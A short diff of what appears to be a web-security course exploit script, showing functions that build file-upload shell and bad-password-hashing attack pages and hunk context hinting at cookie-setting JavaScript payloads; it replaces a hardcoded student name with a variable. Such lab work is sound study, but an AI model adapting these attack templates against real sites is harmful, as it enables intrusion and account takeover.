@@ -151,7 +151,7 @@ xhr.send(null);
         """Exploit file upload for shell access!
         """
         import hashlib
-        handin_hash = hashlib.sha1(b"txiaotin_cryptography").hexdigest()
+        handin_hash = hashlib.sha1("{}_cryptography".format(victim_name).encode('ascii')).hexdigest()
         with open('./fileupload.html', 'r') as f:
             html = f.read().format(server_ip=IP, handin_hash=handin_hash)
 
@@ -180,7 +180,7 @@ setInterval(function(){{ document.cookie=&#34;{}&#34;;}}, 500);
         """List bad password hashing
         """
         import hashlib
-        handin_hash = hashlib.sha1(b"txiaotin_flag").hexdigest()
+        handin_hash = hashlib.sha1("{}_flag".format(victim_name).encode('ascii')).hexdigest()
         with open('./badpassword.html', 'r') as f:
             html = f.read().format(server_ip=IP, handin_hash=handin_hash)
 
